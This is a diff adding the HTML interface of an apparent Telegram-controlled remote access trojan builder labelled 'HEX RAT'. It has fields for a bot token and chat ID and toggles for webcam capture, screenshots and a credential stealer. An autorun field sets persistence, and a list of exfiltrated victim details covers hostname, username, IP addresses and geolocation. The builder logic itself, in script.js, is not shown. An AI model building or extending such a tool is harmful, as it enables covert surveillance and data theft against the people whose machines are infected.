@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Telegram Бот Билдер</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <div class="form">
+      <h2>Настройки бота</h2>
+
+      <label for="botToken">Токен бота:</label>
+      <input type="text" id="botToken" placeholder="Введите токен бота" />
+
+      <label for="chatId">Chat ID:</label>
+      <input type="text" id="chatId" placeholder="Твой Chat ID" />
+
+      <button id="loadBotInfo">Загрузить бота</button>
+
+      <label for="botMessage">Стартовое сообщение:</label>
+      <textarea id="botMessage" rows="4" placeholder="HEX RAT BY VSENIKIZANYATI"></textarea>
+
+      <h3 style="margin-top: 20px;">AutoTask</h3>
+      <div class="task-buttons">
+        <button type="button" id="toggleWebcam">WebCamera</button>
+        <button type="button" id="toggleScreenshot">Screenshot</button>
+        <button type="button" id="toggleStiller">Стиллер</button>
+      </div>
+
+      <h3 style="margin-top: 20px;">Настройки системы</h3>
+      <label>AutoRun:</label>
+      <input type="text" id="autoRun" placeholder="Название автозапуска" />
+
+      <button id="buildBot" class="btn build-btn">Build</button>
+    </div>
+
+    <div class="preview">
+      <h2>Предпросмотр</h2>
+      <div class="message-box">
+        <div class="bot-header">
+          <img id="avatarPreview" src="https://via.placeholder.com/40" alt="Аватар" />
+          <strong id="namePreview">Имя Бота</strong>
+        </div>
+        <div id="messagePreview">HEX RAT BY VSENIKIZANYATI</div>
+        <div id="buttonsPreview" class="buttons"></div>
+      </div>
+
+      <div class="dictionary">
+        <h3>Словарь переменных</h3>
+        <ul>
+          <li><code>{date_time}</code> — дата и время</li>
+          <li><code>{hostname}</code> — название компьютера</li>
+          <li><code>{ip_address}</code> — текущий IP</li>
+          <li><code>{system_info}</code> — информация о системе</li>
+          <li><code>{username}</code> — имя пользователя</li>
+          <li><code>{ip_addresses}</code> — список IP</li>
+          <li><code>{cpu_usage}</code> — использование ЦПУ</li>
+          <li><code>{memory_usage}</code> — использование оперативной памяти</li>
+          <li><code>{timezone}</code> — часовой пояс</li>
+          <li><code>{geo_info}</code> — геолокация</li>
+          <li><code>\n</code> — перенос строки</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
